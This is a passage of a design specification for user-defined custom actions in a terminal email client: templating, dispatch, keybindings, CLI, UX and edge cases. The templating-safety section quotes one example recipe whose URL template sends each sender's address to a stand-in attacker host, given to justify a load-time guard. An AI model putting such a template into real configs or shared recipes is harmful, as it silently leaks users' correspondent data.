       literal `category` value of `"Inkwell/ReplyLater"` or
       `"Inkwell/SetAside"` is rejected with the redirect message
       (§3.5 row 9–10 / review #13). A templated category that
       *might* render to one of those strings is permitted (we
       can't know at load time).
     - Each templated param string parses via `text/template.New(...)
       .Parse(...)`. Compiled template stored in `Step.Templated`.
       Per-key `requiresMessageContext` bit is computed (true if
       the parsed AST references any of `.From`, `.FromName`,
       `.SenderDomain`, `.Subject`, `.ConversationID`, `.MessageID`,
       `.Date`, `.Folder`).
     - For `move.destination` and `move_filtered.destination`:
       if any token references message-derived data, require
       `Action.AllowFolderTpl == true` or load error (review #4
       in the prior research / review #14 in adversarial pass).
     - For `open_url.url`: if any token references message-derived
       data, require `Action.AllowURLTpl == true` or load error.
     - Each pattern param compiles via `Deps.PatternCompile`.
       Compiled pattern stored in `Step.PatternC`.
     - `permanent_delete*` op + `confirm = "never"` → load error.
     - Decode optional step-level `stop_on_error` (`*bool` —
       three-valued: nil = use action default, true / false =
       explicit override).
   - Compute the resolved `StopOnError` default per §2.4.
   - Compute the action-level `requiresMessageContext` aggregate
     (true if any step's templates touch per-message vars). Used
     by the CLI `--filter` rejection in §4.11.
3. Cross-action validation:
   - No two actions share `name`.
   - No two actions share `key` (when both have a key).
   - No action's `key` collides with an existing default `KeyMap`
     binding **after** `[bindings]` overrides resolve (the
     duplicate-detector lives in `keys.go:findDuplicateBinding` and
     gains a new "custom_action:<name>" entry per action).

A failure at any of these steps returns a `*MultiError` from
`LoadCatalogue` and `cmd_run.go` exits 1 with the joined messages
on stderr (existing config-error path).

## 4. Implementation

### 4.1 Wiring at startup

```
cmd/inkwell/cmd_run.go
  ↓ resolves actions.toml path from config + flag
  ↓ customaction.LoadCatalogue(ctx, path, Deps{PatternCompile: pattern.Compile, Now: time.Now})
  ↓ catalogue passed into ui.Deps.CustomActions
internal/ui/app.go
  ↓ Model.customActions = catalogue
  ↓ keymap binding step injects ByKey entries (§4.6)
  ↓ palette collectPaletteRows appends a row per action (§4.8)
  ↓ help overlay buildHelpSections appends a "Custom actions" group (§4.9)
internal/customaction/executor.go
  ↓ Run(ctx, action, msgCtx) → []StepResult
internal/action/executor.go (existing) — every step delegates here
```

The catalogue is a value on the model, not a pointer, per
CLAUDE.md §4 (sub-models are values). The map fields (`ByName`,
`ByKey`) are immutable post-load; nothing mutates them at
runtime.

### 4.2 The Context

```go
// internal/customaction/context.go

// Context is the per-invocation data the templating layer reads
// and the executor passes step-to-step. Mutated only by the
// prompt_value op (binds UserInput).
type Context struct {
    AccountID       int64
    From            string  // "alice@example.com" (lowercased canonical)
    FromName        string  // "Alice Liddell"
    SenderDomain    string  // "example.com"
    To              string  // first recipient if multiple
    Subject         string
    ConversationID  string
    MessageID       string
    Date            time.Time
    Folder          string  // parent folder display name
    UserInput       string  // populated by prompt_value
    SelectionIDs    []string  // for thread / filtered actions
    SelectionKind   string    // "single" | "thread" | "filtered"
}
```

Templating uses Go `text/template` directly. The variable names
are PascalCase (Go convention). The roadmap's draft syntax used
`{sender}` (lowercase, single braces) — we deviate to `{{.From}}`
because (a) we already pull in `text/template` for the
`internal/render` package; (b) Go's escaping (`{{.From | js}}` /
`html`) is one less concern when a future op outputs to a
browser; (c) consistency with aerc.

Backwards compat with the roadmap's draft syntax: at load time, a
template string containing single-brace lower-case variables
(`{sender}`, `{subject}`, etc., with a fixed allowlist of names)
is **rewritten** to the Go-template form before parsing, with a
slog warning naming the action. v1.2 may remove the rewrite.
The supported alias map:

| Roadmap syntax    | Go-template equivalent |
|-------------------|------------------------|
| `{sender}`        | `{{.From}}`            |
| `{sender_name}`   | `{{.FromName}}`        |
| `{sender_domain}` | `{{.SenderDomain}}`    |
| `{subject}`       | `{{.Subject}}`         |
| `{conversation_id}` | `{{.ConversationID}}`|
| `{message_id}`    | `{{.MessageID}}`       |
| `{user_input}`    | `{{.UserInput}}`       |
| `{date}`          | `{{.Date.Format "2006-01-02"}}` |
| `{folder}`        | `{{.Folder}}`          |

### 4.3 Templating safety

- Templates execute against `Context` only. There is no `os`,
  `env`, or `exec` injected — `text/template`'s default `FuncMap`
  is empty for non-string types. We do not register `template.FuncMap`
  with anything beyond the Go default helpers (`html`, `js`,
  `urlquery`, `print`, `len`).
- The `move`/`add_category`/`open_url` params are templated AFTER
  the focused message resolves. If the template renders to the
  empty string (e.g. `{{.SenderDomain}}` on a malformed `From`),
  the step fails at runtime with a "template rendered empty
  destination" toast and `stop_on_error` decides whether the
  sequence continues.
- `set_sender_routing.destination` is **not** templated (static
  enum). The load-time check rejects any `{{ }}` in the value.
- `prompt_value.prompt` is templated (so the prompt can name the
  sender). The user's response is **not** re-templated — it is
  bound verbatim into `{{.UserInput}}` for the rest of the
  sequence. This avoids a template-injection surface where a
  user's clipboard content runs as a template directive.
- Folder destinations templated from message data
  (e.g. `destination = "{{.SenderDomain}}"`) are guarded by an
  opt-in flag `allow_folder_template = true` on the action. By
  default, a step whose `destination` template references a
  message-derived variable is rejected at load time. This guards
  against the Outlook Quick Steps footgun where a template
  + a typo produces stray folders. With `allow_folder_template
  = true`, the step is permitted; the runtime path still respects
  the existing folder-not-found toast (no folder is auto-created).
- **`open_url` URLs that template PII** (`{{.From}}`,
  `{{.Subject}}`, `{{.SenderDomain}}`, `{{.MessageID}}`,
  `{{.UserInput}}`) are rejected at load time unless the action
  declares `allow_url_template = true`. Without the guard, a
  community-shared `actions.toml` (the §1.1 outcome) becomes a
  supply-chain vector — a "helpful" recipe of the form
  `open_url = "https://attacker.example/?leak={{.From}}"` would
  silently exfiltrate every triaged sender to an attacker on
  every keypress. With the opt-in flag the user has acknowledged
  the URL touches message content. URLs that contain only
  literal characters (no template directives) are unrestricted.
  This matches T-CA3 in the threat-model addition (§10 spec 17
  row) and was added in response to the §0 adversarial-review
  finding #14.

### 4.4 The transactional contract

When the user invokes a custom action (key, palette, `:actions
run`, CLI), the executor follows three phases. The contract is
**batched-transactional resolve**: each contiguous run of steps
between `prompt_value` boundaries is resolved atomically before
that run dispatches.

1. **Build Context.** Populate `Context` from the focused message
   (or conversation / filtered-set IDs for thread / `_filtered`
   ops). The store fetch happens once per resolve call; the
   focused message's `FlagStatus`, `IsRead`, `From`, etc. are
   captured at this moment. Subsequent template renders read
   from this snapshot, not the live store row.

2. **Slice into resolve-batches.** Walk `Steps[]` and split at
   each `prompt_value`. The result is a list of batches:
   `[steps_0..i, prompt, steps_i+2..j, prompt, ...]`. Each
   non-`prompt_value` batch is resolved + validated as a unit;
   the prompt is a synchronous boundary.

3. **Resolve batch 0** (steps before the first `prompt_value`):
   - Execute every templated param against `Context`. Any
     `text/template.Execute` error aborts the entire sequence
     before any step dispatches; toast names the failing step.
   - Validate resolved values (e.g. `move.destination` non-empty;
     `open_url.url` parses as `http(s)://`; templated category
     not in the reserved set for `add_category`).
   - For folder-bearing ops, call
     `ExecDeps.Folders.Resolve(ctx, accID, path)` (§4.5 — the
     wiring layer plugs in the existing
     `cmd/inkwell/cmd_folder.go resolveFolderByNameCtx`). A
     not-found error aborts the batch with "folder '<name>'
     not found".

4. **Confirm.** Apply §3.4. The modal body renders **only the
   resolved batch 0** (templates after the first `prompt_value`
   render with `{{.UserInput}}` shown literally as a placeholder
   `«user input»`). `No` aborts before any side effect; `Yes`
   proceeds.

5. **Dispatch batch 0.** For each resolved step:
   - Call the registered op (§3.5).
   - On err with `stop_on_error == true` for that step (or the
     action default), break the loop; remaining steps are
     reported as "skipped" in the result toast.
   - On err with `stop_on_error == false`, continue.

6. **Pause on `prompt_value`.** When the loop reaches a prompt:
   - Render the prompt template (which sees the original
     `Context` plus any prior `UserInput` binding).
   - Open `CustomActionPromptMode`. Store the suspension on
     `m.customActionContinuation` with the remaining batches.
   - On user submission, bind the typed string into
     `Context.UserInput`, re-resolve **the next batch** (steps
     between this prompt and the next prompt or sequence end)
     using the now-bound `UserInput`, and dispatch.
   - On `Esc` (cancel): the continuation is dropped. Toast names
     the step at which cancellation occurred. Steps that
     already dispatched stay applied.
   - **Important honesty: post-prompt resolve failures are NOT
     pre-flight.** If batch N's resolve fails (e.g. `move.destination =
     "{{.UserInput}}"` resolves to a non-existent folder), the
     prior batches' side effects stay applied. The failure surfaces
     as a multi-line toast with steps 0..i marked done, the prompt
     marked answered, step i+1 marked failed. This is the only
     deviation from "zero side effects on resolve failure" — it
     is intrinsic to the prompt-then-dispatch model and is
     acknowledged in §6 edge cases.

The contract, restated:

- **Pre-prompt resolve is atomic.** If batch 0 fails to resolve,
  zero side effects. Batches after the first prompt CAN partially
  apply if a later batch fails to resolve.
- **Dispatch is per-step optimistic** (CLAUDE.md §3.3). A
  successful queued step writes locally and enqueues a Graph
  reconciliation. Synchronous ops (`set_sender_routing`,
  `set_thread_muted`) commit immediately and are not undoable
  via `u`.
- **Failures surface together.** A step that errors at dispatch
  produces a per-step toast row; the wrapper collates rows into
  one multi-line toast at the end (§5.2). No dialog loop. No
  silent failures.

### 4.5 Op dispatch table

```go
// internal/customaction/ops.go

// Each registered op is one row. The closures capture the
// dependency surface (executor, store, services) by interface so
// the table is unit-testable with stubs.
type opSpec struct {
    Name         string
    Destructive  bool
    DispatchFn   func(ctx context.Context, deps ExecDeps, msg *Context, params map[string]any) error
    Validate     func(rawParams map[string]any) error          // load-time
    NeedsBulk    bool                                          // true for *_filtered
}

// ExecDeps is the dispatch surface. To avoid an import cycle with
// internal/ui (which imports this package via Model.customActions),
// the executor / triage / unsubscribe interfaces are declared
// **here**, at the consumer site (Go convention; CLAUDE.md §8).
// internal/ui's existing TriageExecutor / BulkExecutor /
// ThreadExecutor / UnsubscribeService satisfy these; cmd_run.go
// passes the same concrete values into both ui.Deps and
// customaction.ExecDeps without re-wrapping.
type ExecDeps struct {
    Triage      Triage           // spec 07 — see local interface below
    Bulk        Bulk             // spec 09
    Thread      Thread           // spec 20
    Mute        Muter            // spec 19 — wraps store.MuteConversation/UnmuteConversation
    Routing     RoutingWriter    // spec 23 — wraps store.SetSenderRouting
    Unsubscribe Unsubscriber     // spec 16
    Folders     FolderResolver   // resolves a path/alias to a folder ID
    Pattern     func(string, pattern.CompileOptions) (*pattern.Compiled, error)
    OpenURL     func(url string) error  // wired by cmd_run.go
    PromptValue func(prompt string) (string, error) // injects via the prompt modal continuation
    NowFn       func() time.Time
    AccountID   int64
    Logger      *slog.Logger
}

// Local executor interfaces — small, consumer-defined.
type Triage interface {
    MarkRead(ctx context.Context, accID int64, msgID string) error
    MarkUnread(ctx context.Context, accID int64, msgID string) error
    ToggleFlag(ctx context.Context, accID int64, msgID string, currentlyFlagged bool) error
    Archive(ctx context.Context, accID int64, msgID string) error
    SoftDelete(ctx context.Context, accID int64, msgID string) error
    PermanentDelete(ctx context.Context, accID int64, msgID string) error
    Move(ctx context.Context, accID int64, msgID, destFolderID, destAlias string) error
    AddCategory(ctx context.Context, accID int64, msgID, category string) error
    RemoveCategory(ctx context.Context, accID int64, msgID, category string) error
}

type Bulk interface {
    BulkMove(ctx context.Context, accID int64, msgIDs []string, destFolderID, destAlias string) (any, error)
    BulkPermanentDelete(ctx context.Context, accID int64, msgIDs []string) (any, error)
    BulkAddCategory(ctx context.Context, accID int64, msgIDs []string, category string) (any, error)
}

type Thread interface {
    ThreadExecute(ctx context.Context, accID int64, msgID, destFolderID, destAlias string) (int, []any, error)
    MessageIDsInConversation(ctx context.Context, accID int64, conversationID string) ([]string, error)
}

type Muter interface {
    MuteConversation(ctx context.Context, accID int64, conversationID string) error
    UnmuteConversation(ctx context.Context, accID int64, conversationID string) error
}

type RoutingWriter interface {
    SetSenderRouting(ctx context.Context, accID int64, addr, dest string) (string, error)
}

type Unsubscriber interface {
    Resolve(ctx context.Context, msgID string) (UnsubAction, error)
    OneClickPOST(ctx context.Context, url string) error
}

// UnsubAction mirrors ui.UnsubscribeAction. Defined locally to keep
// the import graph clean; the wiring layer adapts.
type UnsubAction struct {
    Method string  // "POST" | "URL"
    URL    string
}

// FolderResolver maps a user-typed path or leaf alias to a folder ID.
// Wired by cmd_run.go from the existing CLI helper
// (cmd/inkwell/cmd_folder.go resolveFolderByNameCtx — already used
// by spec 18 / spec 14 CLI). The TUI move-picker is unchanged
// (it is interactive); the resolver is a non-interactive helper
// that the new CLI subcommand and the custom-action executor share.
type FolderResolver interface {
    Resolve(ctx context.Context, accID int64, pathOrName string) (id, alias string, err error)
}
```

The dispatch table is a **package-level `var ops = map[OpKind]opSpec{
... }` literal** in `ops.go`. No `init()` function is used —
CLAUDE.md §8 limits `init()` to "registering test fixtures", and
a static lookup map literal does not need `init()`. The table is
read-only post-load (Go's compile-time map literal). Adding a new
op = adding a key/value pair to the literal + a test.

### 4.6 KeyMap wiring

`KeyMap` (`internal/ui/keys.go`) is **not** extended with new
fixed fields per action — that would couple `keys.go` to
runtime config. Instead, the model carries a separate `customKeys
map[string]key.Binding` keyed by action name, populated from the
catalogue at startup. The dispatcher (`updateNormal` /
`updateMessageList` / `updateMessageViewer`) gains:

```go
for name, binding := range m.customActions.ByKey {
    if key.Matches(keyMsg, binding) {
        return m.runCustomActionCmd(name)
    }
}
```

The for-loop is O(N) per keystroke; N ≤ 64 for any realistic
config (the load-time cap on `[[custom_action]]` blocks is 256,
and only those with a `key` populate `ByKey`). This is well
under the spec 04 keystroke budget.

`findDuplicateBinding(km KeyMap)` (`internal/ui/keys.go:330`)
remains as the single-source duplicate scan inside the static
`KeyMap`. Spec 27 adds a sibling helper:

```go
// findDuplicateBindingWith extends findDuplicateBinding with a
// custom-action key set. Returns ("", "", nil) when there is no
// collision; otherwise (kmField, customName, key) naming both
// colliders.
func findDuplicateBindingWith(km KeyMap, custom map[string]key.Binding) (kmField, customName, theKey string)
```

The call ordering in `cmd_run.go` is fixed and load-bearing:

1. Load `config.toml`. Resolve `[bindings]` overrides.
2. Build the final `KeyMap` via `ApplyBindingOverrides`.
3. Run the existing `findDuplicateBinding(km)` to catch
   intra-`KeyMap` collisions (this stage is unchanged by spec 27).
4. Load `actions.toml`. Build `customKeys map[string]key.Binding`
   from the catalogue.
5. Run `findDuplicateBindingWith(km, customKeys)` to catch
   `KeyMap`↔custom collisions and intra-`customKeys` collisions.
6. Wire the catalogue into `Deps`.

Collision messages name both colliders: "binding 'n' is bound to
both `KeyMap.MarkUnread` and custom_action 'newsletter_done' — set
`[bindings].mark_unread` to a different key, or rename the custom
action's `key`".

### 4.7 Prompt-value modal

The spec adds a new mode `CustomActionPromptMode` to
`internal/ui/messages.go`. Its UI is the same single-line input
modal as `CategoryInputMode` (spec 07 §11), with the prompt
string rendered as the modal header. The modal is dismissed via
`Esc` (cancels the entire sequence — the continuation is dropped
with a "custom action '<name>': cancelled" toast) or `Enter`
(captures the typed string into `Context.UserInput` and resumes
the dispatch loop). The modal does NOT echo the prompt to the
status bar after dismissal — it would echo `{{.From}}` which is
PII (see §7 logs).

### 4.8 Palette integration (spec 22)

`internal/ui/palette_commands.go` `collectPaletteRows` gains a
new section emitter that walks `m.customActions.Actions` and
produces one `PaletteRow` per action:

```go
PaletteRow{
    ID:        "custom_action:" + a.Name,
    Title:     a.Name,
    Subtitle:  a.Description,
    Binding:   renderBinding(a.Key),  // empty when no key set
    Section:   "Custom actions",
    Available: customActionAvailability(m, a),
    RunFn: func(mm Model) (tea.Model, tea.Cmd) {
        return mm, mm.runCustomActionCmd(a.Name)
    },
}
```

`Section: "Custom actions"` adds a new badge value to the spec 22
palette section list. The mixed-scope sort treats the new section
identically to `Saved searches` — section-tied rows display the
section as a dimmed prefix. No new sigil is added; users browse
custom actions via the unscoped search or `>` (commands-only)
which now includes custom actions in addition to static commands.

`customActionAvailability(m, a)` returns `Availability.OK = false`
when:

- The focused message is missing and the action's first step requires
  one (everything except `filter` / `move_filtered` /
  `permanent_delete_filtered` started solo).
- `a.When` does not include the focused pane.
- A required dep is nil (e.g. `unsubscribe` step with `Unsubscribe`
  unwired emits "unsubscribe service not wired").

Palette frecency (`recents`, spec 22 §4.4) treats the
`custom_action:<name>` ID identically to any other row ID — no
new bookkeeping.

### 4.9 Help overlay integration

`internal/ui/help.go` `buildHelpSections` gains a "Custom actions"
section appended after "Modes & meta". The section iterates
`m.customActions.Actions` in name order; each row renders
`(binding, description)`. When the catalogue is empty, the
section is omitted entirely — the help overlay does not render an
empty group (consistent with spec 22's saved-searches section).

### 4.10 The `:actions` cmd-bar verb

`internal/ui/app.go` `dispatchCommand` gains:

| Form | Behaviour |
|------|-----------|
| `:actions` | Lists every custom action by `name` and `description` in the status-bar overlay (the same overlay `:rule list` uses). |
| `:actions list` | Alias for `:actions`. |
| `:actions show <name>` | Renders the action's sequence in the status-bar overlay. When a focused message exists, templates render in their **resolved** form (matching the confirm modal). When invoked from a context without a focused message (e.g. the folders pane), templates render literally (`{{.From}}` etc.). The two cases are flagged by a header line. |
| `:actions run <name>` | Runs the action against the focused message — alias for the action's bound key, same continuation model (§4.4). |

**`:actions reload` is NOT in v1.1.** CLAUDE.md §9 forbids hot
reload; a spec cannot grant itself an exception. Editing
`actions.toml` requires a binary restart, same as `config.toml`.
The recipe-iteration ergonomic concern is addressed by the
`inkwell action validate` CLI subcommand (§4.11) which runs the
loader against the on-disk file and prints the resolved sequence
without launching the TUI — recipes are iteratively tested via
`validate` and reloaded by re-launching. A future spec may revisit
hot-reload alongside an explicit CLAUDE.md §9 amendment; that is
out of scope here (§12).

### 4.11 CLI subcommand

`cmd/inkwell/cmd_action.go` (new file) registers an `action`
subcommand. All forms inherit the existing `--account <id>` flag
convention (matching `cmd_messages.go`, `cmd_route.go`, etc.) —
multi-account is out of scope for v1.1 (ROADMAP §1.2) but the
flag is wired for forward-compatibility.

```
inkwell action list                                    # name + description, one per line
inkwell action show <name>                             # rendered sequence (literal templates)
inkwell action run <name> --message <id>               # execute against a specific message ID
inkwell action run <name> --filter <pat>               # execute against a filter set
inkwell action validate [--file <path>]                # load + validate without running
```

`run --message <id>` populates `Context` from the cached row.
`run --filter <pat>` is for actions whose first step is `filter`
or whose only steps are `*_filtered` ops; per-message template
variables (`{{.From}}`, `{{.Subject}}`, `{{.ConversationID}}`,
`{{.MessageID}}`) are unbound in this mode. The loader rejects
`--filter` invocation against an action whose templates reference
those variables (load-time computes a `requiresMessageContext`
bit per step; runtime CLI rejects with a precise diagnostic
naming the offending step). The reverse — `--message <id>` against
an action with `*_filtered` steps — is allowed; the focused
message just provides the template surface for the pattern
literal.

Exit codes:

- `0` — full success.
- `1` — resolve-time failure (zero side effects), or invocation
  error (`--filter` + per-message-templated step, etc.).
- `2` — partial success (some steps ran, some failed). The full
  toast text is printed to stderr.
- `3` — confirm rejection. The stdin TTY is offered the Y/N
  gate; non-TTY assumes No unless `--yes` is passed.

`validate` is the recipe-author's friend — runs the loader
against the on-disk file and prints each action's resolved
sequence with literal templates. Replaces the deferred
`:actions reload` workflow (§4.10): edit recipe → `inkwell action
validate` → restart binary if validation passes.

### 4.12 Action queue interaction

Each step that maps to a queued action enqueues exactly one
`store.Action` record (or N records for the bulk variants). The
custom-action layer does not introduce a new `parent_action_id`
or `group_id` column. The framework is a **dispatcher**, not a
recorder.

Implications:

- `u` (undo) reverses the **last** enqueued step. Pressing `u`
  five times after a five-step custom action reverses each step
  in reverse order, exactly as if the user had pressed five
  individual keys. The undo toast names the underlying primitive
  ("Undid: archive m-1234"), not the custom action — the user's
  mental model is "the last thing I did", and the custom action
  is a higher-level abstraction over five lower-level "things".
- The action-queue replay path (spec 03 §6) is unchanged; it
  doesn't know custom actions exist.
- The spec 17 audit trail (`docs/SECURITY_TESTS.md` — every
  triage action logs at INFO with redacted PII) holds: each step
  emits its existing log line. The custom-action layer adds a
  single INFO line per invocation: "custom_action run name=<x>
  steps=<N> destructive=<bool>". No new redaction surface.

## 5. UX

### 5.1 Confirm modal body

```
┌─ Run custom action: newsletter_done ───────────────────────┐
│ Newsletter triage: mark read, route sender to Feed,        │
│ archive.                                                   │
│                                                            │
│   1. mark read                                             │
│   2. route sender (alice@news.example) → Feed             │
│   3. archive                                               │
│                                                            │
│ Run? [y/N]                                                 │
└────────────────────────────────────────────────────────────┘
```

The body shows the resolved sequence. Templates that produced
sender / domain values render as their resolved string — the user
sees "alice@news.example", not "{{.From}}".

For sequences containing `move_filtered` or
`permanent_delete_filtered`, the modal renders the resolved
pattern + destination without a pre-flight count:

```
   2. move every message matching ~f alice@news.example → /Archive/Newsletters
      (count resolves at run time)
```

A pre-flight count would require a new `Bulk.Estimate(pat) → int`
helper on `BulkExecutor` — out of scope for v1.1 per the
adversarial-review reconciliation note (finding #5). A future
spec may add the helper and upgrade this line; the modal layout
already reserves the trailing `(count resolves at run time)`
slot so the upgrade is purely additive. The downstream
`Bulk.BulkMove` / `BulkPermanentDelete` will return its real
count to the result toast (§5.2).

### 5.2 Result toast

Single-line on full success when **all** steps are queue-routed
(undoable):

```
✓ newsletter_done: 3 steps OK
```

When **any** step is synchronous-non-undoable
(`set_sender_routing`, `set_thread_muted`), the toast carries an
explicit `u`-not-applicable hint so the user's mental model
stays accurate:

```
✓ newsletter_done: 3 steps OK (1 step not reversible by `u`: set_sender_routing)
```

Multi-line on partial success or failure (each step row carries
✓ / ✗ / – for skipped, plus a tail marker `[non-undoable]` when
applicable):

```
custom action 'newsletter_done':
  ✓ mark_read
  ✓ set_sender_routing → feed   [non-undoable]
  ✗ archive: folder 'Archive' not found
```

The toast persists in the status bar until the next user input
(same dwell as existing error toasts, spec 04 §6.2). The
`[non-undoable]` marker is rendered with the `Dim` style (theme
token; existing).

### 5.3 The `key` rendering

v1.1 supports **single-key bindings only** (literal rune,
`ctrl+<rune>`, or `alt+<rune>`). Chord bindings like `<C-x> n` are
rejected at load time. The reason: spec 20's chord state lives in
per-feature bools (`threadChordPending`, `streamChordPending`)
rather than a generalised `PendingChordMode` constant — adding a
third chord namespace requires refactoring the chord dispatch into
a `chordPending map[string]chordState`, a real chord-mode
constant, and matching e2e coverage. That refactor belongs in its
own spec (see §12). v1.1 single-key bindings do not interact with
spec 20's chord state; pressing `T` then a custom-action's key
runs the spec 20 thread chord then the custom action — the same
behaviour as pressing `T` then any other unrelated key.

Custom-action bindings render in:

- The help overlay's "Custom actions" group with one row per
  action ("`<key>` — `<description>`").
- The palette row's right-aligned binding column (spec 22 §3.2).
- `:actions show <name>` overlay header.
- `inkwell action list` output (with the binding in a third
  column).

### 5.4 Why we don't ship grouped undo

Bundling N enqueues into one undoable group would need:

- A new `undo_group` text column on `actions` (spec 02 migration).
- A "rollback the whole group" path in `e.Undo` that dispatches
  N reverse ops in reverse order, with its own partial-failure
  surface.
- Threat-model review (spec 17) of the group rollback with
  partial success.

That's a bucket-sized change for a marginal UX win — the user
who just chained `mark_read → route → archive` typically wants
to *undo everything* (`u u u`) or *keep the route, undo the
archive* (`u`). Selective rollback is more useful than atomic
rollback. v1.1 ships the cheaper, more-flexible primitive (per-
step undo) and defers the grouped-undo question to a future spec
when there's a concrete user request for it.

### 5.5 No event-driven hooks

The custom actions framework is **invocation-driven only**. There
is no `on_new_message`, no `folder_hook`, no `inbound_rule`. The
user must press a key (or `:actions run`, or the CLI subcommand)
for an action to fire. Reasons:

- Inbound rules belong in spec 28+ (server-side `messageRules`
  CRUD); they need a different UX (CRUD modal) and a different
  storage model (Graph-side state).
- An on-new-message client-side hook would race the sync engine
  and the optimistic-write path in non-obvious ways. Spec 03 §5
  is the wrong place to add inline mutation.
- aerc's `:exec` and mutt's `folder-hook` are useful precedents
  for the future inbound-rules spec, not for v1.1 here.

### 5.6 Empty-catalogue UX

When `actions.toml` is missing or contains zero entries:

- `:actions` and `:actions list` show "no custom actions
  configured — see `docs/user/how-to.md#custom-actions`".
- The palette omits the "Custom actions" section.
- The help overlay omits the "Custom actions" group.
- The CLI `inkwell action list` exits 0 with no output.

The empty case is **not** an error; new users start here.

## 6. Edge cases

| Case | Behaviour |
|------|-----------|
| `actions.toml` does not exist | Empty catalogue. No error. (§5.6) |
| `actions.toml` exists but is empty | Empty catalogue. No error. |
| Action's `key` collides with an existing `KeyMap` default not overridden in `[bindings]` | Startup error naming both colliders. (§4.6) |
| Two actions share a `key` | Startup error. |
| Two actions share a `name` | Startup error. |
| Action references an unknown op | Startup error with deferred-ops message if applicable. (§3.6) |
| Action's `permanent_delete*` step + `confirm = "never"` | Startup error. (§3.4) |
| Action's `move.destination` references a non-existent folder at run time | Resolve phase fails; zero side effects; status toast names the missing folder. (§4.4) |
| Action's `set_sender_routing` step on a focused message with empty `From` | Resolve phase fails; zero side effects; toast "From address missing". |
| Action's `set_thread_muted` on a message with empty `ConversationID` | Same shape — resolve fails, zero side effects, toast "no conversation ID". |
| Action's `prompt_value` modal cancelled (Esc) | Sequence aborts. Steps that already dispatched stay; remaining steps skipped. Toast "custom action '<name>': cancelled at step <i>". |
| Action's `prompt_value` modal returns an empty string | The empty string binds to `{{.UserInput}}`. If a downstream step renders to empty (e.g. `move.destination = "{{.UserInput}}"`), that step fails at template-validation time; sequence aborts iff `stop_on_error`. The user can re-trigger. |
| Two consecutive `prompt_value` steps | The second overwrites `{{.UserInput}}` — the user is asked twice; only the latest answer survives. Documented behaviour. |
| Action's `filter` step followed by a non-`*_filtered` step | Load-time warning naming the action ("filter on step <i> followed by <op> on step <j> — non-filtered ops do not consume the filtered set"). The warning does not abort the load; the action runs and the non-filtered op operates on the originally-focused message. |
| Action's `unsubscribe` step on a message with no `List-Unsubscribe` header | The step fails with the existing spec 16 toast ("no unsubscribe header"); subsequent steps obey `stop_on_error`. |
| Action invoked from CLI (`inkwell action run`) when binary is offline | Steps enqueue locally; reconciliation happens on next sync. The CLI exits 0 because resolve + enqueue both succeeded. |
| Action invoked from CLI without a `--message` and without a `--filter` and the action's first step needs a focused message | CLI exits 1 with "this action needs --message <id> or --filter <pattern>". |
| User edits `actions.toml` while the binary is running | The change does NOT take effect until restart (CLAUDE.md §9). Running the action via its old binding dispatches the OLD definition. The user iterates with `inkwell action validate` (no TUI) and restarts the binary to pick up changes. Documented in §4.10 (no `:actions reload` in v1.1). |
| `inkwell action validate` finds an error in `actions.toml` while the binary is running with the prior (good) version | `validate` exits non-zero and prints the error; the running binary is unaffected. |
| `actions.toml` is a symlink to outside the user's `$HOME` | Loaded as-is. The path-traversal guard in spec 17 §4 is irrelevant — this is a config file the user explicitly named, not user-supplied content. |
| `flag` op against an already-flagged message | No-op (logged at DEBUG, NOT counted as a failure in the result toast — appears as `– flag: already flagged`). Same shape for `unflag` against an unflagged message. (§3.5) |
| `add_category` step with literal `category = "Inkwell/ReplyLater"` | Load-time error: "use `thread_add_category` for stack categories — Reply Later is thread-level (spec 25)". Same for `Inkwell/SetAside`. (§3.5 / review #13) |
| `add_category` step with `category = "{{.Subject}}"` that renders to `"Inkwell/ReplyLater"` at runtime | Allowed; runtime AddCategory enqueues normally. We do not re-validate templated values against the reserved-name list — the user explicitly templated, and the existing spec 25 view ignores per-message-only categorisation. The action is poorly written but not wrong. |
| Custom action with `key` containing a chord like `"<C-x> n"` | Load-time error: "chord bindings deferred to a future spec (§12); use a single-key binding or `:actions run`". |
| Custom action's `open_url.url` template references `{{.From}}` without `allow_url_template = true` | Load-time error naming the action and the offending step ("URL template references {{.From}} — set `allow_url_template = true` to opt in"). (§4.3) |
| Custom action's `move.destination = "{{.SenderDomain}}"` without `allow_folder_template = true` | Load-time error analogous to URL guard. (§4.3) |
| The `prompt_value` modal is visible while the user is screen-sharing or recording | The resolved prompt template (which may contain `{{.From}}`) is on-screen by design. Operators recording sessions should be aware. Test fixtures redact — `internal/customaction/testdata/` uses the synthetic domain `example.invalid` and dummy `From` strings. (§7) |
| Action with `allow_folder_template = true` whose template renders to `..` or `/` | Folder resolution rejects (the existing folder resolver does not split on path separators inside a single component); the resolver-not-found toast fires. |
| Two `prompt_value` steps with the same `prompt` string | Independent — the modal opens twice in sequence. |
| Custom action invoked from the palette while a confirm modal is already up | The palette dispatch is gated on `m.mode == NormalMode` (spec 22 §4.6); the keystroke does not reach the dispatcher. The user must dismiss the existing modal first. |
| Post-`prompt_value` resolve failure (e.g. step after the prompt resolves to a non-existent folder) | Earlier batches' side effects stay applied (intrinsic to the prompt-then-dispatch model — §4.4). Toast is multi-line: prior steps marked ✓, prompt marked answered, failing step marked ✗ with the resolve error. The user then `u`-undoes the queue-routed prior steps if desired (synchronous ops are not undoable). |
| Two consecutive `prompt_value` steps with no intervening op | The two prompts open in sequence; second answer overwrites `Context.UserInput`. Documented in the existing edge-case row above (kept). |
| User edits `actions.toml`, runs `inkwell action validate` (clean), then their TUI session is still running on the old catalogue | Documented (§4.10). User restarts the TUI to pick up the new catalogue. |
| Action loaded with `prompt_confirm = true` AND `confirm = "always"` | The legacy alias is silently consistent; only one warning emits. |
| Bench: a 32-step action invoked against a focused message, no `prompt_value` | Runtime ≤ 30ms p95 (resolve + enqueue 32 records — see §8). |
| User overrides `[bindings].something = "n"` after authoring an action with `key = "n"` | Startup error from `findDuplicateBinding`. The user disambiguates by changing one of the two. |
| Action whose `description` contains `\n` | TOML decoder accepts but the help overlay renders only the pre-`\n` portion; the full string lives in `:actions show <name>`. (Documented; no validation error.) |
| Action invoked via key from inside `CommandMode` (cmd-bar open) | No-op (cmd-bar consumes the keystroke first). Same UX shape as palette / folder-picker. |

## 7. Logs and redaction

Every step in a custom action is dispatched via the existing
spec-07/spec-09 executors, which already log at the appropriate
level with redaction. The custom-action layer adds:

- One INFO line per invocation:
  `custom_action_run name=<name> steps=<N> destructive=<bool>
  selection_kind=<single|thread|filtered> selection_size=<n>`.
  No `From`, no `Subject`, no `MessageID` (the user's name is
  not PII per CLAUDE.md §7.3, but `From` is — and the action
  name is sufficient to correlate with the user's intent).
- One WARN line per invocation that aborts at resolve:
